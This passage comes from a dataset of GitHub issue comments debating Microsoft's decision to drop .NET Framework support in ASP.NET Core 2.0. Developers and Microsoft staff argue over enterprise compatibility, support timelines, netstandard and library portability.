- There are a bunch new threading primitives that require new API that will light up new scenarios if we're able to consume them (https://github.com/dotnet/corefx/issues?q=is%3Aopen+is%3Aissue+author%3Adavidfowl+label%3Aarea-System.Threading), those are just some of the things I've personally filed. 


Without the ability to rev the core primitives, we're encouraged to fork them and make things that look like them but aren't them. It's the reason we have our own little BCL within ASP.NET Core https://github.com/aspnet/Common/tree/dev/src/Microsoft.Extensions.Primitives.

That was  just a random dump of things I can see us doing in the near term that affects very fundamental pieces of .NET."
620	"@FransBouma 

> NET full to move forward faster, as it doesn't put enough resources on .NET full to keep up with .NET core. Look at the amount of APIs added to .NET full in the past 2 years. Does that tell you a large team is working on that?

That's just not true. Things are continually ported to .NET Framework but as we all know the risk is *considerably* higher than making those same changes in .NET Core. Don't you all hate it when an update to .NET  Framework breaks your application? We do too so we invent all kinds of processes to mitigate it, you wouldn't believe the strangle hold it puts on engineering to maintain it. We still manage to do features in-spite of all of it. That said, it will just *never* move as fast as .NET Core, it's a windows component that ships on the windows schedule."
621	"> I understand but I don't think it would make a difference in your ability to port anything really. The same EOL policy still exists.

@davidfowl Correct. But *how you frame it* means something. Not to mention *when it's communicated*, if ever. It won't necessarily give people more time to do the actual work, but it would give them more time to think and make the correct decision (for them).

Currently, if you've started porting to/using ASP.NET Core on .NET Framework, it seems you have three choices:

1. Port all your code and dependencies to .NET Core and move to ASP.NET Core 2.x.
    - This would be the optimal solution, but it could require tons of work, and for some, it might even be out of their control because of 3rd party libs.
2. Stay on ASP.NET Core 1.x and .NET Framework and hope you'll be able to do 1. before it's unsupported.
    - This is pretty risky. Within a year (or two, or three? who knows?), you could risk running on an unsupported platform.
3. Move back to ASP.NET 4.x
    - While this alternative leaves you supported, you'll be ""going back"" and undoing work you've already started. And also, let's face it; this platform won't be getting much love going forward.

If you'd known in advance and could plan for it, I think both 1. and 2. are decent alternatives. The issue is that both alternatives have quite a few unknowns. What about library A? What about library B? Will library A ever be ported?

Right now, I think a lot of people feel they're being forced into making a choice, without a clear picture of what the choices actually entail."
622	"@khellang (in your hypotheical solution)

4. Move to ASP.NET Core 2.0 on .NET Framework
   - This is pretty risky. Within a year, you could risk running on an unsupported platform.
"
623	"@davidfowl 
> Honest question (this is me asking not Microsoft), do you favor stability and compatibility over new features? If yes, why choose ASP.NET Core?

Honest answer:
Favor: Stability and compatibility is paramount. New features are nice, but when they land, they simply *must not* break the existing ecosystem.
Why ASP.NET Core: Simply because it runs on OS X and Linux.

An ecosystem like .NET (old and/or core) or also Java is chosen by businesses. And when they make their decision, they put a *lot* of effort in developing code for that platform / ecosystem.

Now, one of our customers, for example, already invested a lot in ASP.NET Core. Based on the previous announcements and sold ideas of .NET Core, code was written. This new (ASP.)NET Core code we (painfully) wrote with a team over the course of the initial development of (ASP).NET Core, starting with its inception, is a set of servers and client libraries, with quite a bunch of business logic.
And this code, besides running on Linux server, providing services, is currently also being used in a set of very old applications that talk to these services, and these are a hell of a mix of WPF / Windows Forms / C++/CLI and normal C++ (including DirectX stuff).

And now you're just simply cutting off our clients investment in quite a few man-years of effort into .NET Core code for the existing applications, as it will be impossible to re-use the new .NET Core code in the actual applications (the new servers and business logic libraries were build for).

To get back to the question: A business would chose .NET Core as "".NET, now also for XPlat"", while expecting the very same compatibility and stability as .NET gave us in the last 17 years. And, to be frank, this is the single reason for .NET Core. If you wouldn't wanted that, you would use Node.js or even Java. Both are much more mature and XPlat than .NET Core now.

And, just to elaborate a litte bit more: .NET Core was cool and fast-paced at the early stages with project.json and all. And then, out of reasons of ""compatibilty with .NET"" project.json was taken from us in favour of Msbuild and .csproj again. And now the benefits of exactly this ""compatibility with .NET"" is also taken away, in favour of.. what exactly?
"
624	"@gingters

First of all, great reply!

> Why ASP.NET Core: Simply because it runs on OS X and Linux.

Based on that, it seems like MVC 5 on mono is what you really wanted right?

> To get back to the question: A business would chose .NET Core as "".NET, now also for XPlat"", while expecting the very same compatibility and stability as .NET gave us in the last 17 years. And, to be frank, this is the single reason for .NET Core. If you wouldn't wanted that, you would use Node.js or even Java. Both are much more mature and XPlat than .NET Core now.

> And, just to elaborate a litte bit more: .NET Core was cool and fast-paced at the early stages with project.json and all. And then, out of reasons of ""compatibilty with .NET"" project.json was taken from us in favour of Msbuild and .csproj again. And now the benefits of exactly this ""compatibility with .NET"" is also taken away, in favour of.. what exactly?

This is the basically the crux of the issue. Based on your assessment:

> This new (ASP.)NET Core code we (painfully) wrote with a team over the course of the initial development of (ASP).NET Core.

You really just wanted the existing .NET Framework on linux with good old ASP.NET 4.x compatibility. Is that a fair summary? 
"
625	"> Favor: Stability and compatibility is paramount. New features are nice, but when they land, they simply must not break the existing ecosystem.

.NET Core is actually a more stable platform than Desktop as it allows side-by-side execution where Desktop does not. 

If you want to use newer features in the next version of Desktop you need to upgrade the entire machine to that new version and that effects everything on that machine, not just the app that wants to use the newer features. Which is fine if you have a dedicated server for a single purpose; but not if you have many apps running on the same server which upgrade at different rates (or never upgrade at all!)"
626	"@davidfowl wrote:
> It's up to frameworks to decide if they want to run on .NET Framework, UWP, .NET Core, mono etc. It's a choice. Orleans doesn't ship with .NET Core. ASP.NET Core does. Those products are one and the same.

In Orleans' case, we support .NET Standard 1.5 in our ""2.0 Technical Preview"" builds, but have been waiting for .NET Standard 2.0 so that we can make a stable release. At present I don't see any blockers for us - my concern is only about future divergence. That divergence has to happen at some point, though.

👍 **Huge thank you for sticking around to answer everyone's questions, @davidfowl & co! It must be seriously stressful.**"
627	"> > NET full to move forward faster, as it doesn't put enough resources on .NET full to keep up with .NET core. Look at the amount of APIs added to .NET full in the past 2 years. Does that tell you a large team is working on that?

> That's just not true. Things are continually ported to .NET Framework but as we all know the risk is considerably higher than making those same changes in .NET Core. Don't you all hate it when an update to .NET Framework breaks your application? We do too so we invent all kinds of processes to mitigate it, you wouldn't believe the strangle hold it puts on engineering to maintain it. We still manage to do features in-spite of all of it. That said, it will just never move as fast as .NET Core, it's a windows component that ships on the windows schedule.

that ignores the fact you can release the libraries _you_ depend on as netstandard2.0 packages so aspnet can run on .net full too. Additionally, making changes to .NET full isn't without risk, but please don't make it sound like it's a terribly organized pile of code where one change can make everything crumble. 

> We still manage to do features in-spite of all of it.

Yeah so does every other .NET developer ;) Once you release something, you're stuck with that API, we all have this. You however want to take a shortcut (like the ASPNET team has done many times before!) and move without that burden. But that's not going to fly in the end. 

> That said, it will just never move as fast as .NET Core, it's a windows component that ships on the windows schedule.

I think here we have the crux of the matter, right? The .NET core team can do what they want without communicating with the behemoth 'WinDiv'. Why doesn't Microsoft solve this internal politics crap in-house and make sure .NET full + .NET core are versioned / moving properly without the windows politics? 

Btw, still interested in how you would sell SQL Server Enterprise's encryption API to .NET core 2.0 users. 

"
628	Also, I must add; I'm pretty impressed how long this thread has been going, with so many people involved, while still remaining civil ❤️ That's not something you see every day on the internetz 👏 Maybe the .NET OSS ecosystem is growing up after all? 😉
629	"> that ignores the fact you can release the libraries you depend on as netstandard2.0 packages so aspnet can run on .net full too. 

> Additionally, making changes to .NET full isn't without risk, but please don't make it sound like it's a terribly organized pile of code where one change can make everything crumble.

It's big and has existed for a long time. Like any legacy system some parts are better than others. It doesn't make the code less reliable but it does make some parts practically impossible to change. There are so many fun stories veterans can tell you about how bug fixes in one areas broke obscure scenarios in applications in other parts. It's tangled, that's what happens when the dependency boundaries aren't well defined. You don't even have to believe me just go and browse referencesource.microsoft.com. In place updates are the reason we need to add a config switch for ever single potentially breaking change to .NET Framework. It's physics, it just can't move as fast.

> Yeah so does every other .NET developer ;) Once you release something, you're stuck with that API, we all have this. You however want to take a shortcut (like the ASPNET team has done many times before!) and move without that burden. But that's not going to fly in the end.

We love shortcuts! Developers are lazy 😄 . We also want to genuinely improve our .NET Core without disrupting what .NET Framework represents. Maybe we should have renamed it to something else, like Sparkle 😄 .

> I think here we have the crux of the matter, right? The .NET core team can do what they want without communicating with the behemoth 'WinDiv'. Why doesn't Microsoft solve this internal politics crap in-house and make sure .NET full + .NET core are versioned / moving properly without the windows politics?

Read my other answer about physics.


> Btw, still interested in how you would sell SQL Server Enterprise's encryption API to .NET core 2.0 users.

That's not my area of expertise, I'll let somebody else answer that."
630	@khellang lol that is because GitHub issues haven't attracted MS hating trolls yet. Currently Twitter is their medium for that where there's no downvote yet :)
631	"@davidfowl 
>You really just wanted the existing .NET Framework on linux with good old ASP.NET 4.x compatibility. Is that a fair summary?

No, not really. Our client required complete new / shiny (micro) services, to supplement their existing .NET 4.x (they were 3.5 when we started) Windows desktop applications.

We when you went beta with all the shiny Core stuff, we started to write the new server-code for the all-new MVC on top of ASP.NET Core together with accompanying DTO, business logic and client-libraries, which are also being used in parallel in the existing 4.6 desktop applications to talk to the all-new-servers.

Also, some of the all-new ASP.NET Core servers don't run on Linux only, but also as windows services with Topshelf (on top of full 4.6 framework).

So the thing is, a lot of investment was done, and now we're seem to be stuck with .NET Core 1, as moving on to 2 (and losing netstandard) would also mean, we can't reuse the assemblies in the existing Desktop application (the services and accompanying libs were created for) anymore.

So the most important thing for us would be to still be able to use the new (ASP).NET Core libraries we write in .NET 4.6 desktop applications (because thats what they were build for), while being able to stay on a supported .NET Core version as long as the desktop .NET Version is supported, where the code can run on.

So, as long as .NET Core 1. is supported as .NET 4.6 is, and there is a linear upgrade path to a .NET Core x when .NET 5 comes out, and .NET Core x code is capable of running on .NET 5, then we're fine."
632	"@gingters Are you using .net features not in netstandard2.0 on the asp.net services?

If not then the libs should just work. But I'm guessing you're talking about stuff not in netstandard2.0."
633	@davidfowl  Will c++/cli dlls work on netcoreapp 2.0? We have old 3rd party C++/CLI assemblies which will not be replaced any time sooner.
634	"@davidfowl  wrote:
> ASP.NET Core 2.0 honestly doesn't have that many new features

In which case, why this highly disruptive change now?"
635	"@qrli C++/CLI does not work on CoreCLR. Here's some background on why it won't be supported: https://github.com/dotnet/coreclr/issues/659#issuecomment-91341753
"
636	"Give 4 years support to  1x (porting as much possible from 2x) and go ahead and fast with 2x.  A city car for slow city traffic  and a Ferrari for the highways. We have a lot of competition outside of .net world. 
If  ASP.Net Core succeed, I am sure MS will give the resources to support the 1x for 4 years. Mostly  the culture will change."
637	"@idg10 It's really not. 2.x is pretty much 1.x with performance stuff that are only available in core. I think only major feature is Razor Pages.

So being on version 1.x doesn't mean you are on an outdated version. But this hasn't been communicated very well."
638	"> In which case, why this highly disruptive change now?

guess this pretty much summarizes it https://github.com/aspnet/Home/issues/2022#issuecomment-300141134"
639	"@hallatore 
I know it works, as it does _now_. We can stay on 1 for now. The problem is going forward. When we want (or worse: need) to upgrade to (ASP).NET Core 2 libraries (i.e. when 1 goes out of service, and there's a critical security hole fixed) we face the problem that we can't upgrade, as this would make it impossible to use our libs that need the upgraded packages in the .NET desktop apps.

Edit / add: Unless there will be a new full .NET framework that is capable of running the new, fixed .NET Core libs that is on a linear upgrade-path for the existing legacy desktop app."
640	"@gingters Not sure I understand.

If your desktop libs work with netstandard2.0 they should also run on core. (if they invoke wpf stuff etc they won't of course)
If this is the case then you should be able to use asp.net core 2.0.

If your desktop libs crash on core because they use stuff not in netstandard2.0. Then I see why you need to stay on 1.x. And I see why the short EOL is a problem.

Would 1.x be a easier/better choice if you knew 2.x only contain mostly core perf stuff (Meaning 1.x is not outdated vs 2.x). And that 1.x will get patches and be supported for * years?"
641	"@hallatore It's the other way round. Old application: Mix of Windows Forms, WPF, C++/CLI, normal C++, DirectX, millions lines of code etc. pp, running on 4.6 full framework.

On .NET Core: New business logic libraries (using also other libs, i.e. the .NET Core version of Serilog), abstractions libs + services + client libraries for these services. Services need to run on Linux and as windows services (currently Topshelf on full .NET 4.6 framework, as soon as windows service support lands in Core that could be changed, though).

Now the new business logic and abstractions as well as the service client libraries are also consumed from the .NET 4.6 applications. This means we are not capable of upgrading them, as they will need to run on the full .net framework as long as the desktop app does (which we can assume will be pretty much for as long as a desktop can live, unless full framework goes away in general).

"
642	@gingters You can still have the shared library projects in your solution targeting netstandard _min(usable)_ and consume those libraries from your ASP.NET Core 2.0 code as well as packaging them up to be used from WPF, Xamarin, UWP, whatever.
643	it is really sad that you MS guys still do not get the point. you still think it is only api gap issue. you still think people can just modify their code and it will work on netcoreapp... i thought you understand enterprises much better than google.
644	"> Based on that, it seems like MVC 5 on mono is what you really wanted right?

@davidfowl I mean, come on. That's a dismissive and frankly insulting answer. Can anybody at MS confirm that a single dev is even assigned to Framework ASP anymore? I'm not trying to be a jerk here, but it seems like sometimes the community is talked down to.

There's no reason under the sun that I should consider .Net Core and ASP.Net Core to be the same product. There hasn't been any messaging to support it at all. Especially when you consider that Mono came under the Microsoft wing _after_ the .Net Core announcement. It has always been messaged as the smaller, nimbler, xplat version of .Net. Not only that, but we all remember the days when ASP.Net Core was actually ASP.Net 5 and was going to work everywhere. Heck, that change is just over a year and half ago only.

Is the self-hosted HTTP story in netstandard20 effectively ""use Kestrel 1.x""? I'm not sure the Nancy folks are going to care hugely for that, and neither do I. ASP.Net 2.x may be incremental feature-wise, but Kestrel 2 has a serious perf benefit that we could seriously use the day it comes out."
645	"@davidfowl 

> It's big and has existed for a long time. Like any legacy system some parts are better than others. It doesn't make the code less reliable but it does make some parts practically impossible to change. There are so many fun stories veterans can tell you about how bug fixes in one areas broke obscure scenarios in applications in other parts. It's tangled, that's what happens when the dependency boundaries aren't well defined.

I think this is an interesting comment. I remember watching an older NDC conference session recording with @davidfowl and @DamianEdwards picking apart of the legacy cruft in ASP.NET 4 that you really wanted to leave behind - it was really fascinating to get peek inside that black box of code.

But I think this comment also mirrors the concerns many of the us have with our own codebases. We maintain large legacy systems, often not well designed with poor dependency boundaries. It's practically impossible to rewrite some of these systems for .NET Core. The business simply won't allow the risk of that much change.

I don't know what the right answer is. But I know that for our own applications, we'll be using the full framework and ASP.NET4/MVC5 for the foreseeable future (we still have a chunk of WebForms won't be rewritten for quite some time!). I hope to see MVC5 get some love now that it's _finally_ [moved to GitHub](https://github.com/aspnet/aspnetwebstack) - I'm even willing to donate my own time and effort to make it better (e.g. better async support, performance improvements, etc.)."
646	@qrli Enterprises still have full .NET 4.5 to run on their Windows Server 2008 R2 IIS 7.5 Web Farms. Nobody's taking that away from them.
647	"@mattnischan 

> Is the self-hosted HTTP story in netstandard20 effectively ""use Kestrel 1.x""? I'm not sure the Nancy folks are going to care hugely for that, and neither do I. 

[`HttpListener`](https://apisof.net/catalog/System.Net.HttpListener) is part of netstandard20 therefore also netcore20 nothing is being taken away on that front by going netcore20."
648	"> `HttpListener` is part of netstandard20 therefore also netcore20.

And I suppose I can expect the same requests per second from `HttpListener`?"
649	"@markrendle True. For now.

But what would you suggest when one other libraries used by our shared stuff (i.e. serilog, newtonsoft, autofac etc.) drops support for netstandard_min(usable), (maybe just because they feel its too much of an effort to support both worlds) and there is a critical security issue detected in the latest version that still supports full framework?"
650	"@mattnischan 

> >HttpListener is part of netstandard20 therefore also netcore20.

> And I suppose I can expect the same requests per second from HttpListener?

Ok then, Nancy is .NETStandard 1.6 so you can use it on Core 2.0 and use Kestrel 2.0. Better?"
651	"@gingters I would suggest crossing that bridge when you come to it.

> Never let the future disturb you. You will meet it, if you have to, with the same weapons of reason which today arm you against the present.
> _~ Marcus Aurelius_"
652	That is not as useful a mantra when delivering software which has no maintenance budget and must be used largely unchanged for years to come.
653	If it must be largely unchanged for years to come then why does it matter what happens to the libraries it depends on in those years to come?
654	@markrendle Now just assume you are required, by law (at least in some countries), to provide emergency protocols for exactly these cases, before a version of the application ships, as it might be used in environments where people's lives might be at stake.
655	"> So you want a web server that is as fast as Kestrel, and your only specific requirement is that it is not Kestrel?

> Ok then, Nancy is .NETStandard 1.6 so you can use it on Core 2.0 and use Kestrel 2.0. Better?

@markrendle @benaadams No, I think you misunderstand, and again, not trying to be a jerk, just pointing out that there are other customers of pieces of ASP.Net Core that aren't the whole thing. I'd just like to host our production platform on top of Kestrel 2.0 when it comes out, and our production platform might be on Framework for a while. I can't target netcoreapp20.

Nancy may be netstandard16 but it doesn't matter because I can't use Kestrel 2.0 except on Core 2.0. I realize this is specific, and maybe the answer is truly ""then write your own webserver that works on framework that's as fast as Kestrel 2. Kestrel is for ASP.Net only."" But I'd hate for that to be the message."
656	@gingters @gulbanana I don't understand how a shipped application with a fixed set of dependencies is going to break because an open source project stops supporting an arbitrary version of the underlying framework at some putative future date.
657	@mattnischan Yes, I figured out what you meant and deleted that comment :)
658	"@stefanolson 

> Because I need to share code between the server and my desktop applications does that mean I can never have the latest version of ASP.Net?

If you target .NET Standard with your libraries, you can use them in both Desktop and Core. For libraries target .NET Standard, then you have universal platform support: Desktop, Core, Mono, Unity, UWP, Tizen etc

An ASP.NET application is an executable; the end point, it isn't a library. The final output, the ASP.NET application/executable needs to run on a platform.  Eventually any of its platform libraries will be consumed by the ASP.NET application so there is no advantage to them not being the same target as the platform.

.NET Core is a good platform as it has a broad cross-platform coverage; can be installed side-by-side with Desktop and can be upgraded independently app by app; rather than whole machine and every app.

Some items do have uses outside; so [Wyam](https://github.com/Wyamio/Wyam) uses Razor for static site generation; Razor is currently .NET Standard 1.3 so consuming it outside Core isn't currently a problem.

There are some edge cases mentioned above:

Using libraries which don't support the .NET Standard 2.0 feature set. A lot of them are hopefully gaps that can be filled - and at the start of this issue MS were asking what those gaps were so they could prioritize them.

Running a WebApp embedded in for example a UWP app; however if Desktop was still supported but changed to version 4.7.1 you'd still be in the same situation as UWP doesn't currently support 4.7.1 and by the time it did ASP.NET would require 4.7.2, then 4.7.3 etc. It would be a Sisyphean task as the other platforms would never catch it; so it would just be busy work without much point?
"
659	"> Yes, I figured out what you meant and deleted that comment :)

No worries, good sir. 👍 "
660	"@davidfowl 
> How does ASP.NET Core revving versions affect that? If we dropped .NET Framework support in 3.0 (as people seem to be eluding to in this thread), wouldn't you be in that same dead end regardless? You'd have your ASP.NET Core 2.0 application ported running on framework for a year and when 3.0 comes out, you'd be unable to upgrade. You would be able to do this anyway with ASP.NET Core 1.1.x which runs on .NET Framework and is supported even when ASP.NET Core 2.0 is out.

Just saying (as I understand) that ""sometime we needed to break with full .net why not right now"" is missing an important point. I'm sure that lots of people was waiting for the release of core 2.0. Because it's publicly promised a lot of improvements in compatibility with full .net. So many libraries authors are also waiting to start migration to core. So I guess that after core 2.0 released we'll much more migrated libs on Core. And so binding asp.net core to core 3.0 would be much less frustrating for ecosystem then it's right now. Because at the moment of 3.0 these should less blocking things from migrating to core.
Right now it's a disaster.

Previously I was assessing starting migration of our framework (very similar story to what @benaadams  described) onto core/asp.net core in two steps: migrate web part (which is on mvc/webapi now) onto asp.net core and keep full .net and then migrate all other stuff on core when all dependencies will have corresponding implementations for core. Currently what blocks us is Oracle ADO provider and Postgres ADO provider (there could other incompatibilities in corefx we didn't dig into it yet). Now this plan is dead. So we have to sit and wait for migration of dependencies abandoning all new stuff in Core world. And all this is only because of the fact that someone in MS decided that we need ""moving fast"" platform. "
661	"@markrendle The application is not going to break just because of that. The issue is a different one:
Because .NET Core 2 dropped support for the full framework (where it ran fine on in version 1, and it's from Microsoft where you don't expect such a basic, elementary feature to be dropped when updating to a new version), also your dependencies might drop support for this scenario rather sooner than later.
Someone finds a critical security issue in one of the libraries used, and no update is issued for the version you are stuck on, as newer versions don't support your runtime anymore. Now, since your application is used in a very regulated environment you need to provide an emergency plan that explains what exactly you will do when an critical security issue is detected and how to roll that fix out to prevent people from getting hurt or worse. A ""well, we can't do anything"" will result in revocation of your allowance to ship that application."
662	"@gingters Look, the point is, you have to make your tech choices based on the information that is currently available and the nature of the marketplace in which your company operates. With the best will in the world, you can't account for all eventualities, however much the bureaucrats and regulators of the world would like to pretend that you can. What if Microsoft are acquired in a hostile takeover by Apple and .NET is discontinued entirely in favour of Swift? What if strong encryption is made illegal in one of the countries you sell to, and all software stacks that include SHA256 are banned? What if Nicolas or James or _insert-name-of-Autofac-maintainer-here_ decide to move to Mars and become moisture farmers? What if the magnetic poles reverse and every single bit of digitally-recorded data is wiped?

As an actual answer to the question of what you, as a company, say you will do in the event of a critical security issue being found in JSON.NET (for example), in the absence of an official update being available, the only possible answer is ""we will fork-and-patch JSON.NET"", which I'm guessing is already the answer to the question of what you would do if James Newton-King were to become indisposed for any reason. In my previous experience working in those kinds of markets, there were escrow arrangements for the source code to proprietary packages for that sort of eventuality; what to do about open source packages is trivial by comparison to that."
663	"> And all this is only because of the fact that someone in MS decided that we need ""moving fast"" platform.

""moving fast"" might be overstating it; going by the previous release schedule of Full Framework it might be better stated as ""without adding an extra 1 - 2 year delay"" into shipping. That's a crazy amount of time in the web world. 

Things are changing fast and the platform needs to stay relevant."
664	"@davidfowl and @DamianEdwards I think that this whole confusion came from the fact that ASP.NET Core 1.x can run on .NET Framework. This created the assumption that ASP.NET Core was the evolution of ASP.NET 4/MVC5; making people migrate to it thinking that they would get all the benefits (speed and new features) while keeping the backward compatibility.

So maybe the long term / permanent answer to this issue is to **re-promote ASP.NET 4/MVC5 as the answer for people seeking backward compatibility with long term support** (and maybe offer to make small improvements as well).

Then, ASP.NET Core can focus on being a new platform that breaks away from the past to offer huge benefits, for those who can make the jump.

In that light, (ASP).NET (Framework) and (ASP).NET Core will be two parallel and equally valid roads that customers can choose. And I think this is the way things should have been from the start."
665	"@markrendle Yes, this is hypthetical, but bureaucracy sadly is a real thing. And yes, you can't (and don't need to) account for all eventualities. Just for the ones you can anticipate.

And now we have the situation that a) dropping of a complete platform (.NET full framework), which was supported in .NET Core 1 just fine, wasn't something you could anticipate. However, since it happened now you can b) anticipate the drop of support for v1 in your other dependencies with a pretty sure ""yes, I can totally see that happen rather sooner than later"".

And yes, forking and backporting fixes is one of the possible solutions, however this is something you want to avoid as much as you can. If the .NET Core team had said something like ""Hey. Look, we don't intend to run on full framework, don't rely on that"", or even better never had made that possible in the first place, this whole discussion wouldn't be necessary as the customer just would not have opted to invest in new stuff on top of .NET Core in the first place.
"
666	@gingters I thought we were at the point where you were happy running your ASP.NET Core web bits on .NET Core 2.x or later, and using .NET Standard 2.x for sharing libraries between Core and Full/UWP/whatever. Because if these libraries were to drop support for .NET Standard 2.x in favour of just .NET Core 2.x, then they'd be dropping support for full .NET too, and you're hosed either way.
667	@markrendle Up to the point where we have a critical issue in one of the ASP.NET Core bits we need to use in the shared stuff after 1x isn't supported anymore.
668	@gingters luckily it's open source and you can support yourself (or pay a 3rd party) if need be!
669	"@markrendle no. pure legacy projects are dead ones. enterprise projects are usually a big mix codebase which contains code/libs date from decades ago to fresh new. being netcoreapp only means you removed the ability to mix. so we can no longer move to your fancy new version but locked down to the old version. and the anti-ms workmates will happily say to me ""i told you..."" and then pushing us to migrate to google solutions."
670	i'm not arguing for supporting netfx forever. but i strongly feel netfx should be supported by asp.net core for at least 2 years from now. not only 1.x but also 2.x.
671	"@qrli Those ""enterprise projects ... big mix codebase which contains code/libs date from decades ago to fresh new."" are everything that is wrong with enterprise projects and needs to stop. Complaining that a new technology stops you from throwing more hunks of mud into a big ball of despair held together with shims, baling wire and denial is like complaining that a new industrial laser cutting machine comes with safety features that stop you leaning in and cutting off important bits of yourself."
672	"@benaadams 
>""moving fast"" might be overstating it; going by the previous release schedule of Full Framework it might be better stated as ""without adding an extra 1 - 2 year delay"" into shipping. That's a crazy amount of time in the web world.
> 
> Things are changing fast and the platform needs to stay relevant.

This is a political/organizational limitation, not a technical one. Look at how the JVM / Java is moving. If they're moving at all. Still relevant, much more than .NET is today. So 'moving fast' isn't the reason people choose Java/JVM. On the contrary. They pick Java/JVM because it lacks all the downsides associated with 'moving fast': it's a stable, dependable platform, where your investment isn't wasted in 1-2 years. 

I don't know, if MS wants to move .net full fast, it will move fast. They own it, they can decide what to do. But the powers that be don't really give much about that: .net full is 'good enough' for where it is now. 

MS has slept at the wheel for many years and now all of a sudden things like performance and memory pressure are important (they are, no doubt about it), while in JVM land investments in those particular aspects of a runtime have been done for many years and that pays off. 

I don't know what the solution is, short term, but in the long term, leaving .NET split across two major departments (.net full with windows, .net core with devdiv) with no common ground/goals other than the same employer doesn't bode well for us outsiders. "
673	"While there are many points being made here, and everyone is trying to make sure they understand others viewpoints, solutions like ""big enterprises shouldn't be like that"" aren't going to help. Even if you could convince them of that, it would take them 20 years to stop being like that, *because they're big enterprises*."
674	"@kolectiv That's true, but accepting that enterprises aren't suddenly going to stop being enterprises doesn't mean you have to actively encourage/enable that sort of behaviour.

It also shouldn't mean that _my_ applications have to run more slowly and cost more to host."
675	"Running a portability analysis on our heavily used libraries that still target .NET 4.x on ASP.NET Core 1.x (EF6, NHibernate, NServiceBus) and man, these libs aren't even *close* to being able to target `netstandard20`.

Lib | Pct
---------- | ---------
EF6 | 62.74
NHibernate | 67.39
NServiceBus | 65.68

And still huge gaps in missing APIs. EF Core still has a large gap with EF6, and we still use NHibernate when there are major features there that don't exist in EF6. NServiceBus we use on any project that does messaging.

Whew."
676	"@markrendle 

> Those ""enterprise projects ... big mix codebase which contains code/libs date from decades ago to fresh new."" are everything that is wrong with enterprise projects and needs to stop. Complaining that a new technology stops you from throwing more hunks of mud into a big ball of despair held together with shims, baling wire and denial is like complaining that a new industrial laser cutting machine comes with safety features that stop you leaning in and cutting off important bits of yourself.

Yeah man, let's tell those pesky Enterprises and large organizations to do things differently, cut the wire! stop the mud flood! That will make them wake up and listen. Oh wait, that won't help, as they already know that but have to work with a lot of things you don't care about or ignore for your own argument. 

Look, no-one says 'new tech: bad!'. It's about pursuing new tech without realizing the consequences that brings with it. We all like to work with the newest bits and not have to worry about old cruft, who wants that? Reality however tells a different story. If you only have to work with the newest bits and don't have to care about old shit, good for you! Sadly we sad work drones in the trenches have to live with a different reality. It would suit you if you at least acknowledge that for a LOT of people reality is just that, they can't change it, they can't make a different future, it's what they have to work with. "
677	"@markrendle I'm not quite sure what you're suggesting? Abandoning our 15 million lines of working C# code and write it all afresh? We were looking at transitioning (slowly) to netstandard 2.0 and hopefully getting access to things like Span etc when it came along, but issues like this make me doubt that is wise. 

We'd like Linux support but this feels more like a divergence. I'd assumed netstandard was going to move ahead with the most advanced implementation and then things like the framework would catch-up, but at least we'd know it would."
678	@FransBouma So we should all suffer because Enterprises want to do stupid things? I shouldn't get nice things because multi-million dollar public sector projects aren't ready for them yet? How does that work?
679	@markrendle What's stupid about wanting to keep working code?
680	"> They pick Java/JVM because it lacks all the downsides associated with 'moving fast': it's a stable, dependable platform, where your investment isn't wasted in 1-2 years.

And you can use System.Web basically forever; its baked into Windows which means its likely never going to go away. You don't get much stable and dependable than that.

ASP.NET Core 1.x -> ASP.NET Core 2.x; all the apis are pretty much the same the main change is dropping support for .NET Framework. It even changes semver for the break 😱 

ASP.NET Core 1.x runs on .NET Core 2.x and .NET Framework, supports .NET Standard 2.x (via .NET Core 2.x); and has the same apis as ASP.NET Core 2.x, So that's the stepping stone release. 

ASP.NET Core 2.x is the break release. It still supports .NET Standard 2.x (via .NET Core 2.x) and not much api-wise has changed between ASP.NET Core 1.x and ASP.NET Core 2.x; but drops .NET Framework."
681	"Could an alternative be:
- ASP.NET Core go ahead and work towards something like `netstandard3.0` (could be 2.x) and just version netstandard faster.  Like once a quarter.
- NetFx next release could jump again to support `netstandard3.x` whenever the next release is.  It wouldn't even have to be the newest standard.

This might be a bad idea because everything used might not need to be part of netstandard but at least ASP.NET Core 2.x would target a standard that the other frameworks will use eventually.

Just spit-balling.  I'm sure this has been brought up."
682	@bencyoung I'm merely suggesting that it's a bit selfish to insist that the entire world should revolve around your 15 million lines of working C# code (which isn't going to stop working, btw). So you can't use ASP.NET Core 2.0. You've still got the full Windows-only framework ASP.NET which has legacy support running through it like Brighton through rock. So there's a new toy you can't play with because it's not economically viable for you to port your code and refactor/rearchitect your application. That sucks, but so do lots of things. But if Microsoft avoid everything that's not going to work for pre-existing two-decade-old legacy codebases that probably still include COM components written in VB 6.0, then in another 20 years they'll be Micro Focus.
683	@adamhathcock That's what I'd assumed netstandard was for - a unification approach, rather than a least common denominator. It can move as fast as it wants, but they'd be a commitment that .NET framework would eventually catch up. Eventually there'd be a netstandard that basically was the .NET framework minus the platform specific stuff and then it would be unified
684	"> NetFx next release could jump again to support netstandard3.x whenever the next release is.

A .NET Framework update is a **forced** update for *every machine* on the planet running Windows (mostly).

A .NET Core update is a update you *for an individual application* **choose** to take.

They are very different beasts."
685	"Well, one easy thing to do would be to stop linking to [this page](https://docs.microsoft.com/en-us/dotnet/articles/standard/choosing-core-framework-server) from [the very first page of the ASP.NET Core docs](https://docs.microsoft.com/en-us/aspnet/core/). 

(Or simply add a line ""Don't choose .NET Framework if you want to continue to use ASP.NET Core!"".)"
686	"> they'd be a commitment that .NET framework would eventually catch up.

There is https://github.com/aspnet/Home/issues/2022#issuecomment-299609207

>our promise generally is: if the type is shared between .NET Framework and .NET Core, we intend to port newly added members to .NET Framework. In very rare cases this might not be possible, but the stake in the ground is that they are automatically considered.

But by the time it catches up, ASP.NET will have moved on to the next .NET Standard version and it would never be the right version of .NET Framework for ASP.NET; it would always be behind."
687	"@markrendle no, they are not big mud ball. big mix does not mean they are bad architected. they are modular. it is that many modules are battle-tested code written long long ago by really smart people or bought from 3rd party. some is by c, some is in fortran, some in c++/cli, etc. to migrate or rewrite, we need to understand them, read papers, gather more real test data, retest the new version. it takes effort but such tasks are never budgeted, but up to ourselves. business people do not care we use .net core or not, but they want the features done. and for 3rd party, we have to urge them or seeking for replacement. 
so,  it can take a few years in practice."
688	"@benaadams 

> And you can use System.Web basically forever; its baked into Windows which means its likely never going to go away. You don't get much stable and dependable than that.
> 
> ASP.NET Core 1.x -> ASP.NET Core 2.x; all the apis are pretty much the same the main change is dropping support for .NET Framework. It even changes semver for the break 😱
